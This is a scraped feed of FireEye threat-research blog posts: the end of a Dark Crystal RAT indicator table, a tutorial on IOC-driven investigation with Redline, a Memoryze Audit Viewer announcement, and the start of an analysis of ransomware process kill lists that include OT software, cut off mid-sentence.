<td width=\"174\" valign=\"top\"><p> <b>Strings</b></p> </td> \n   <td width=\"450\" valign=\"top\"><p>&nbsp;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>Static string</p> </td> \n   <td width=\"450\" valign=\"top\"><p>DCRatBuild</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 4: IoCs for this instance of DCRat</span></p> \n<h4>FireEye Product Support for Dark Crystal RAT</h4> \n<p>Table 5 describes how FireEye products react to the initial sample (MD5: b478d340a787b85e086cc951d0696cb1) and its Dark Crystal RAT payload, or in the case of Mandiant Security Validation, allow a stakeholder to validate their own capability to detect Dark Crystal RAT.</p> \n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"234\" valign=\"top\"><p> <b>FireEye Product</b></p> </td> \n   <td width=\"389\" valign=\"top\"><p> <b>Support for Dark Crystal RAT</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"234\" valign=\"top\"><p>FireEye Network Security (NX)</p> </td> \n   <td width=\"389\" valign=\"top\"><p>Backdoor.Plurox detection</p> </td> \n  </tr> \n  <tr> \n   <td width=\"234\" valign=\"top\"><p>FireEye Email Security (EX &amp; ETP)</p> </td> \n   <td width=\"389\" valign=\"top\"><p>Backdoor.MSIL.DarkCrystal, Backdoor.Plurox, Malware.Binary.exe, Trojan.Vasal.FEC3, Win.Ransomware.Cerber-6267996-1, fe_ml_heuristic detections</p> </td> \n  </tr> \n  <tr> \n   <td width=\"234\" valign=\"top\"><p>FireEye Endpoint Security (HX)</p> </td> \n   <td width=\"389\" valign=\"top\"><p>Trojan.GenericKD.32546165, Backdoor.MSIL.DarkCrystal detections</p> </td> \n  </tr> \n  <tr> \n   <td width=\"234\" valign=\"top\"><p>FireEye Malware Analysis (AX)</p> </td> \n   <td width=\"389\" valign=\"top\"><p>Backdoor.Plurox.FEC2 detection</p> </td> \n  </tr> \n  <tr> \n   <td width=\"234\" valign=\"top\"><p>FireEye Detection on Demand (DoD)</p> </td> \n   <td width=\"389\" valign=\"top\"><p>Backdoor.Plurox.FEC2, FireEye.Malware detections</p> </td> \n  </tr> \n  <tr> \n   <td width=\"234\" valign=\"top\"><p>Mandiant Security Validation</p> </td> \n   <td width=\"389\" valign=\"top\"><p>Built-in Action coming soon</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 5: Support in FireEye products to detect Dark Crystal RAT or validate detection capability</span></p>","descriptionType":"html","publishedDate":"Tue, 12 May 2020 14:30:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure1.png","linkMd5":"0764cfb6d2f7cf1dd7eb3861e780d612","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx/cdn83@2020_5/2020/08/24/14-11-06-550_c429f013ccd2d1ad.webp","destWidth":1327,"destHeight":298,"sourceBytes":28656,"destBytes":30136,"author":"Jacob Thompson","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure1.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn83@2020_5/2020/08/24/14-11-06-550_c429f013ccd2d1ad.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure2.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn75@2020_3/2020/08/24/14-11-19-571_c2d3923f6346306c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure3.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn27@2020_1/2020/08/24/14-11-16-117_e2d0c88195b4f9f5.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure4.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn25@2020_2/2020/08/24/14-11-15-117_afcf315185cd8e84.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure5.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn41@2020_5/2020/08/24/14-11-17-440_c171f00c174cdfd2.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure6.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn73@2020_4/2020/08/24/14-11-16-929_62ff4a6008bafa7d.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure7.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn79@2020_4/2020/08/24/14-11-12-836_78771d4129930cb4.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure10.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn33@2020_1/2020/08/24/14-11-13-021_c4d14cdcc333946e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure12.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn50@2020_5/2020/08/24/14-11-09-248_c329898aa7316e18.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure13.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn27@2020_1/2020/08/24/14-11-10-146_ccf0e3e5e7670853.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure14.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn91@2020_2/2020/08/24/14-11-10-524_0c54311320c8372c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure15.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn78@2020_6/2020/08/24/14-11-19-052_9d56535e7e73980d.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure17.jpg":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn68@2020_6/2020/08/24/14-11-08-822_1eba44b97e15c2de.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure18.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn70@2020_4/2020/08/24/14-11-20-480_ec3e6837c4ce984c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure19.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn85@2020_1/2020/08/24/14-11-20-908_8fae26d460ba027b.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure20.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn80@2020_5/2020/08/24/14-11-10-357_67c0b3f80d9a81a4.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure21.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn36@2020_1/2020/08/24/14-11-10-173_39ce194bb19009f4.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure22.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn55@2020_3/2020/08/24/14-11-09-184_6042c5c3beda1702.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure23.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn12@2020_2/2020/08/24/14-11-12-123_50f9b16a433b4e8d.webp"},"publishedOrCreatedDate":1598278264212},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Investigating Indicators of Compromise In Your Environment With Latest\nVersion of Redline","link":"http://www.fireeye.com/blog/threat-research/2012/04/investigating-indicators-compromise-environment-latest.html","description":"<div class=\"c00 c00v1\"> \n <p>Recently, Mandiant<sup>®</sup> released a new version of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline</a><sup>™</sup>. If you are not familiar with Redline, it is a great tool for investigating a specific Windows host in depth. We will have a more thorough look into Redline in the next month or so. What I wanted to touch on today is one of Redline's brand new features: you can now use Indicators of Compromise (IOCs) to drive your Redline investigations.</p> \n <p>If you are not familiar with IOCs, I urge to you take a moment and head over to <a href=\"http://openioc.org/\">http://OpenIOC.org</a> and have a look around. IOCs are the best way for finding indications of compromise and/or intrusion throughout your enterprise. IOCs are one of the main technologies that power Mandiant Intelligent Response, Mandiant's flagship IR appliance, and have previously been accessible in free products with <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\">IOC Editor</a> &amp; <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-finder.html\">IOC Finder</a>. Some blog entries that might help bring you up to speed are Ryan Kazanciyan's recent post on using Redline for investigation and to create an IOC, and Carrie Jung's post on <a href=\"https://blog.mandiant.com/archives/2074\">investigations into the Duqu worm</a>, including looking at Duqu with Redline and creating an <a href=\"http://openioc.org/iocs/72669174-dd77-4a4e-82ed-99a96784f36e.ioc\">IOC to help you find Duqu</a>.</p> \n <p>Previously, if you wanted to look for an IOC, you would create an IOC using <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\">IOC Editor</a>, and then collect data from a host using IOC Finder. As an additional step, you would run a match against that data and generate a report using IOC Finder in a different configuration. With the latest release of Redline you will still start making your IOC in the Editor, but you can collect the data from a host and match against it in a much simpler manner.</p> \n <p>When you first fire up the latest version of Redline with IOC support (Version 1.5) you will see options that look very similar to previous versions:</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1.png\"><img width=\"300\" height=\"139\" class=\"alignnone size-medium wp-image-2473\" title=\"Figure 1\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-300x139.png\" /></a></p> \n <p>For the sake of simplicity, we will analyze the machine that Redline is running on. In most instances, if you are using Redline to look at any real cases, you will NOT want to analyze the machine that Redline is running on. You will want to dedicate a workstation to running Redline analysis, and then you will want to collect data from suspect machines through a method such as creating a portable agent from Redline (which is discussed in the <a href=\"http://www.fireeye.com/content/dam/fireeye-www/services/freeware/ug-redline.pdf\">Redline User Guide</a>). By doing this you do not have to install Redline on every machine you want to investigate, and thus are not potentially contaminating machines that you need to do real investigations on.</p> \n <p>Clicking on the link that says \"By Analyzing this Computer\" will open a new window in Redline entitled \"Start your Analysis Session.\" Another nice feature of Redline is that you can do more than one thing at a time -- a useful feature once you have some investigation data saved. In this new window, you can choose to add IOCs to your investigation. You can still use Redline the old fashioned way by clicking \"Next\" and bypassing this screen, but what fun would that be? Instead we are going to select the check box that says \"Indicators of Compromise Location:\"</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2.png\"><img width=\"300\" height=\"46\" class=\"alignnone size-medium wp-image-2474\" title=\"Figure 2\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-300x46.png\" /></a></p> \n <p>and then \"Browse\" to the folder that you are keeping your IOCs in. Assuming that you select a folder that has valid IOCs in it, you should quickly see a listing of the IOCs you populated Redline with.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-31.png\"><img width=\"300\" height=\"217\" class=\"alignnone size-medium wp-image-2476\" title=\"Figure 3\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-31-300x217.png\" /></a></p> \n <p>Following the prompt \"Choose an Indicator from the list on the left to see full details,\" if you click on one of the Indicator Names, you will see information about that Indicator. If you want to use only one Indicator, or a specific subset of the Indicators in your IOC directory, click the check box at the top next to Name, and then select the specific Indicator(s) that you want to use by checking just those checkboxes:</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4.png\"><img width=\"300\" height=\"73\" class=\"alignnone size-medium wp-image-2477\" title=\"Figure 4\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-300x73.png\" /></a></p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-5.png\"><img width=\"300\" height=\"79\" class=\"alignnone size-medium wp-image-2478\" title=\"Figure 5\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-300x79.png\" /></a></p> \n <p>So, what if you are new to this? What if you do not have any IOCs on hand? Well, as a shortcut, you can go to <a href=\"http://openioc.org/\">http://openioc.org/</a> and grab a few sample ones that we have available. Ideally, you will eventually build your own IOCs from the investigation data that you discover, but these samples will help you get started for learning purposes. <a href=\"http://openioc.org/iocs/c32ab7b5-49c8-40cc-8a12-ef5c3ba91311.ioc\">Find Windows</a> is a great test IOC, as it requires no malware on your system - it is an IOC designed to find various components of Windows that are common across several different versions of the operating system. Grab one IOC, or grab them all, put them in a directory you can write to, and you will be ready to investigate.</p> \n <p>Let us keep moving along towards conducting an investigation. In the lower right hand corner of Redline, we are going to click the \"Next\" button, which will take us to a page that says \"Configure your Script.\" You will note that the \"Custom\" radio button is currently selected. Please do not touch any of the buttons or checks on this page until you read a little further down.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6.png\"><img width=\"300\" height=\"147\" class=\"alignnone size-medium wp-image-2479\" title=\"Figure 6\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-300x147.png\" /></a></p> \n <p>So, what is going on here? The way the Mandiant investigative workflow functions is around the idea of gathering data from a host and then analyzing it. With IOC Finder running in the default configuration, you would gather ALL the possible information from a host -- a process that could take hours depending on the type of computer and how much you were gathering. While desirable for real, in- depth investigations, it may be a bit frustrating if you are trying to learn how to use the tools or just try things out. We revealed that it is possible to script IOC Finder to limit the amount of data that is being collected, but you still had to know what types of audits you wanted to complete on the host, write the script to limit those audits, and then make sure that everything still ran correctly. That is a lot more than most folks want to worry about when they are trying to conduct a quick investigation.</p> \n <p>With Redline, this process has gotten a lot easier. Redline looks at the IOCs that you have selected, and determines the audits that have to be run to gather the data that you need to match those IOCs. Thus, assuming you do not change anything on the \"Configure your Script\" screen, Redline builds the appropriate script to gather the information for the audits that you need. Redline still always gathers enough information to do a full memory audit - but now IOC audit information required to match IOCs is added to that, including items like disk and registry audits.</p> \n <p>If you want to customize the audits being done, you can do so on this screen. If you deselect options that are needed for your IOCs, you will get a warning letting you know that what you deselected is in fact needed for your IOCs to match properly.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-7.png\"><img width=\"300\" height=\"33\" class=\"alignnone size-medium wp-image-2480\" title=\"Figure 7\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-7-300x33.png\" /></a></p> \n <p>This warning is down at the bottom of the screen near the \"Previous\" &amp; \"OK\" buttons. If you click on the link to \"fix,\" Redline will restore the audit choices to the state they were in when you first arrived at this screen, displaying the \"Custom Audit\" based on your IOCs.</p> \n <p>If you are using Redline for IOC-driven investigation, you can just move on to the next step and have all the information you need for your current IOCs included in the script that will run and collect information without having to do any additional work. Click the \"OK\" button to run the collection script with the options that Redline has selected for you.</p> \n <p>You will see the script fire up, and you should (unless you have disabled UAC) be asked to allow the script to run with elevated privileges:</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-8.png\"><img width=\"300\" height=\"83\" class=\"alignnone size-medium wp-image-2481\" title=\"Figure 8\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-8-300x83.png\" /></a></p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-9.png\"><img width=\"300\" height=\"168\" class=\"alignnone size-medium wp-image-2482\" title=\"Figure 9\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-9-300x168.png\" /></a></p> \n <p>Once you give permission to the script, it will continue to run. If you do not give permissions, it will usually error out (since the script Redline generates cannot write its results or conduct most of the audits without being granted elevated privileges).</p> \n <p>You can watch it run, but likely you will want to go do something else and come back a bit later, since for any decent sized collection of IOCs it is going to take a while, unless you are doing a very small IOC or very simple IOCs. For the sample IOCs on <a href=\"http://openioc.org/\">http://openioc.org/</a> it took around two hours on a Windows 7 VM with 2 Gigs of RAM allocated. Faster machines with more resources are going to usually run faster, with Disk I/O being the main bottleneck, along with Processor. RAM is less of an issue. If you want to have things run faster, you can also try using the Portable Agent version of Redline. We will cover that more next week in an upcoming post on Redline Pro Tips.</p> \n <p>Once you have the items you need, you can look through the results of the audit data gathered as you would a normal Redline analysis -- but you will notice another task running - \"Redline is Creating an IOC Report,\" matching the audit data against IOCs just like IOC Finder would have -- but with no need to run any additional tools!</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-10.png\"><img width=\"300\" height=\"105\" class=\"alignnone size-medium wp-image-2483\" title=\"Figure 10\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-10-300x105.png\" /></a></p> \n <p>Once the IOC report is done, you will see it in the \"IOC Reports Tab\" of the Redline results.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-11.png\"><img width=\"300\" height=\"113\" class=\"alignnone size-medium wp-image-2484\" title=\"Figure 11\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-11-300x113.png\" /></a></p> \n <p>Click on the IOC Report that you just ran (by date/time) to see any matches that were turned up from those IOCs. In this case, there was a hit on the \"Find Windows\" IOC. Click on the \"Find Windows\" title to expand the findings.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-12.png\"><img width=\"300\" height=\"112\" class=\"alignnone size-medium wp-image-2485\" title=\"Figure 12\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-12-300x112.png\" /></a></p> \n <p>The IOC matches are displayed in a format that will look very familiar, if you have ever used IOC Finder in reporting mode. You can click on the \"i\" icon by any matches indicated in the results for details that show much more in depth information on what matched and why.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-13.png\"><img width=\"300\" height=\"133\" class=\"alignnone size-medium wp-image-2486\" title=\"Figure 13\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-13-300x133.png\" /></a></p> \n <p>You will see the IOC that matched listed in the Definition section of the details, and you will see the particular piece of the IOC that hit highlighted in yellow. Clicking the Details tab again will hide this window.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-14.png\"><img width=\"300\" height=\"137\" class=\"alignnone size-medium wp-image-2488\" title=\"Figure 14\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-14-300x137.png\" /></a></p> \n <p>&nbsp;</p> \n <h1>Using IOCs with Redline in investigative workflows:</h1> \n <p>If you are currently using Redline to do host-based investigations, and you have already amassed a large amount of data for hosts that you test against, or you want to gather all the data you can from hosts so you can have it for future reference instead of having to go back to the host again should you expand the scope of your investigation, and still want to use the new IOC feature, fear not! The new version of Redline allows this as well.</p> \n <p>If you have standard audit sets that you capture, or if you capture all of the audit data on hosts as a matter of course, you can add IOCs in after the fact. However, be aware that if you do not have the audit data for a given element of an IOC, obviously the IOC will not be able to match (at least for that element).</p> \n <p>Load the audit data as you normally would in Redline depending on the audit type, and then in the \"IOC Reports Tab,\" look for a button at the bottom that says \"Create a New IOC Report.\"</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-15.png\"><img width=\"248\" height=\"47\" class=\"alignnone size-full wp-image-2489\" title=\"Figure 15\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-15.png\" /></a></p> \n <p>Clicking on this will open up a new \"Start your Analysis Session\" window, which you can then select the directory that houses your IOCs and generate a report on that set of IOCs.</p> \n <h2>Conclusion</h2> \n <p>We've looked at the new feature in Redline 1.5 that allows you to use it to create audits and match IOCs against that audit data. This is only scratching the surface of what you can do with either Redline or with IOCs. Next week, we'll have another blog post with some \"Pro Tips\" on using Redline 1.5 (including discussing Portable Agents), and there will be an upcoming webinar that focuses on Redline more in depth in May.</p> \n <p>For more information on IOCs and OpenIOC, you can visit the <a href=\"http://openioc.org/\">OpenIOC.org</a> website. Will Gibb and I will also be doing a webinar, <a href=\"https://cc.readytalk.com/r/9ua4hlh04a3g\">Fresh Prints of Mal-ware: IOCing Red</a>, on Thursday, April 19 on IOCs and Redline where we will discuss writing a real world IOC from an investigation. We hope you can tune in!</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 19 Apr 2012 20:48:58 +0000","feedId":1226,"bgimg":"","linkMd5":"cd580e956aa5020b43328f8c0198b293","bgimgJsdelivr":"","metaImg":"","author":"Doug Wilson","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-300x139.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn81@2020_1/2020/08/24/14-11-09-333_1875b9969d785aae.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-300x46.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn72@2020_2/2020/08/24/14-11-08-708_49f3e743bd8c2dfe.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-31-300x217.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn82@2020_1/2020/08/24/14-11-19-360_0eed8bb97eb85ad8.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-300x73.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn79@2020_6/2020/08/24/14-11-18-114_a11cbedf9a9e1581.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-300x79.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn65@2020_1/2020/08/24/14-11-20-326_b4f63291ab1bc1f6.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-300x147.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn52@2020_1/2020/08/24/14-11-10-213_74098ed02512f8cd.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-7-300x33.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn27@2020_2/2020/08/24/14-11-14-401_b02cafa60e6e0980.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-8-300x83.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn77@2020_2/2020/08/24/14-11-08-918_a4ea815f2758b5fb.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-9-300x168.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn70@2020_6/2020/08/24/14-11-16-760_861ab14ebf20a444.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-10-300x105.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn42@2020_1/2020/08/24/14-11-14-415_fb0a8b1adaf9c4bc.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-11-300x113.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn49@2020_3/2020/08/24/14-11-14-343_0ef33eee6c74fdb7.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-12-300x112.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn99@2020_2/2020/08/24/14-11-09-346_a1d0dbd0c555d0ec.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-13-300x133.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn30@2020_4/2020/08/24/14-11-14-921_2f03d0862a47d15c.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-14-300x137.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn71@2020_3/2020/08/24/14-11-10-381_b0ad922be776c632.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-15.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn39@2020_1/2020/08/24/14-11-11-071_8bdb9e91fefec2b4.webp"},"publishedOrCreatedDate":1598278264224},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"New Audit Viewer for Memoryze","link":"http://www.fireeye.com/blog/threat-research/2008/11/new-audit-viewer-for-memoryze.html","description":"<p>If you are tired of trying to load <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\" target=\"_blank\">Memoryze's</a> results into Internet Explorer</p> \n<p>or into an Excel spreadsheet, check out the new viewer from Peter</p> \n<p>Silberman. The Audit Viewer is written in Python and comes with</p> \n<p>the BSD license because you know best how you want to view your data.</p> \n<p>Audit Viewer allows the incident responder or forensic analyst to quickly view complex XML output in an easily readable format. Using familiar grouping of data and search capabilities, Audit Viewer makes memory analysis quicker and more intuitive.</p> \n<p> <b>Check out these features:</b></p> \n<ul> \n <li>Process data can be viewed on a per process basis or in its entirety by double clicking the root node, \"Processes\". For example, when you double click on \"Processes\" and then click on the Files tab, all the file handles open on the host are displayed from least frequently to most frequently occurring.</li> \n <li>Ability to search Files, Processes, Mutants, Events, Registry Keys, and Strings using plain text or regex.</li> \n <li>Ability to load multiple Memoryze result sets contained in the same directory.</li> \n <li>Handle types are separated out into more abstract types representing the logical type of the handle such as Files, Directories (part of the Object Manager's namespace), Processes, Keys, Mutants, and Events.</li> \n <li>Memory sections with names are displayed under the DLLs tab.</li> \n <li>Layered drivers are displayed in a tree view. <i>This is useful for finding certain types of keyboard sniffers, network sniffers, and file filtering drivers.</i></li> \n <li>Integrated with Memoryze to seamlessly acquire drivers and processes from live memory and images.</li> \n <li>Ability to scan all processes for \"questionable\" executable sections. <i>These sections have the EXECUTE_READWRITE flag but no name.</i></li> \n</ul> \n<p>Special thanks to Peter for spending his nights and weekends to make this available.</p>","descriptionType":"html","publishedDate":"Tue, 25 Nov 2008 09:40:34 +0000","feedId":1226,"bgimg":"","linkMd5":"006f421ac309bf4db3dfcba844a916f9","bgimgJsdelivr":"","metaImg":"","author":"Jamie Butler","publishedOrCreatedDate":1598278264215},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Financially Motivated Actors Are Expanding Access Into OT: Analysis of\nKill Lists That Include OT Processes Used With Seven Malware Families","link":"http://www.fireeye.com/blog/threat-research/2020/07/financially-motivated-actors-are-expanding-access-into-ot.html","description":"<p>Mandiant Threat Intelligence has researched and written extensively on the increasing financially motivated threat activity directly impacting operational technology (OT) networks. Some of this research is available in our previous blog posts on <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html\">industrial post-compromise ransomware</a> and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/12/fireeye-approach-to-operational-technology-security.html\">FireEye's approach to OT security</a>. While most of the actors behind this activity likely do not differentiate between IT and OT or have a particular interest in OT assets, they are driven by the goal of making money and have demonstrated the skills needed to operate in these networks. For example, the shift to post-compromise ransomware deployment highlights the actors’ ability to adapt to more complex environments.</p> \n<p>In this blog post we look further into this trend by examining two different process kill lists containing OT processes which we have observed deployed alongside a variety of ransomware samples and families. We think it is likely that these lists were the result of coincidental asset scanning in victim organizations and not specific targeting of OT. While this judgement may initially seem like good news to defenders, this activity still indicates that multiple, very prolific, financially motivated threat actors are active inside organizations’ OT—based on the contents of these process kill lists—with the intent of profiting from the ransom of stolen information and disrupted services.</p> \n<h4>Two Unique Process Kill Lists Deployed Alongside Seven Ransomware Families Include OT Processes</h4> \n<p>Threat actors often deploy process kill lists alongside or as part of ransomware to terminate anti-virus products, stop alternative detection mechanisms, and remove file locks to ensure critical data is encrypted. As a result, the deployment of these lists increases the likelihood of a successful attack (MITRE ATT&amp;CK T1489). In post compromise ransomware attacks, attackers regularly tailor the lists to include processes that are relevant to the victim’s environment. By stopping these processes, the attacker makes sure to encrypt data from critical systems, which may remain unaffected if the process is currently in use. As the likelihood of crippling critical systems increases, the target is more likely to suffer impacts on its physical production.</p> \n<p> <i>First Process Kill List Has Been Leveraged By At Least Six Ransomware Families</i></p> \n<p>Mandiant identified samples of at least six ransomware families (DoppelPaymer, LockerGoga, Maze, MegaCortex, Nefilim and SNAKEHOSE)—all of which have been associated with high-profile incidents impacting industrial organizations over the past two years—that have leveraged a common process kill list containing 1,000+ processes. The list, which we briefly discussed in an earlier <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html\">blog post from February 2020</a>, includes a couple dozen processes related to OT executables—mainly from General Electric Proficy, a suite used for historians and human-machine interfaces (HMIs). We note, that while the inclusion of these processes in this kill list could result in limited loss of view of historical process data, it is not likely to directly impact the operator’s ability to control the physical process itself.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/otransomware/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Snippets from “kill.bat” deployed alongside LockerGoga (L) and MegaCortex process kill list (R)</span></p> \n<p>The earliest iteration we identified of the shared kill list was a batch script deployed alongside LockerGoga (MD5: 34187a34d0a3c5d63016c26346371b54) in January 2019 (Figure 1). Other iterations of the list we have observed are also hardcoded directly into the ransomware binaries. The different techniques used to deploy the process kill list, the use of different malware families, and slight variations between each list iteration (mainly typos in the processes, e.g.: <i>a2guard.exea2start.exe</i>; <i>nexe</i>; <i>proficyclient.exe</i>) indicate that likely more than one actor had access to the true source of the process kill list. This source could be for example a post of processes shared on a dark web forum, or an independent actor sharing the compiled list with other actors.</p> \n<p>We think it is likely that the OT processes identified in this list simply represent the coincidental output of automated process collection from victim environment(s) and not a targeted effort to impact OT. This is supported by the relatively limited and specific selection of OT-related processes, rather than a broader selection of many vendors and OT-related processes that would have been suggestive of targeted external research. Regardless, this does not downplay the significance of the inclusion of OT processes in the list, as it suggests that sophisticated financially motivated actors, such as FIN6, have had at least some visibility into a victim’s OT network. As a result, the actors were able to tailor their malware to impact those systems, without the explicit intent to target OT assets.</p> \n<p>Most types of ransomware attacks in OT environments will result in the disruption of services and a temporary loss of view into current and historical process data. However, OT environments impacted by a ransomware that leverages this kill list and happen to be running one or more of the processes used by the initial victim(s)—and therefore are included on the list—may face additional impacts. For example, historian databases would be more likely to be encrypted, possibly resulting in loss of historical data. Other impacts could include gaps in the collection of process data corresponding to the duration of the outage and temporary loss of access to licensing rights for critical services.</p> \n<p> <i>Second List Deployed Alongside CLOP Ransomware Sample Has a Higher Chance of Impacting OT Systems</i></p> \n<p>Mandiant analyzed a second, entirely unrelated sample of ransomware (MD5: 3b980d2af222ec909b948b6bbdd46319) from the CLOP family with a hardcoded list for enumeration and termination of processes that includes a number of OT strings. The list contains 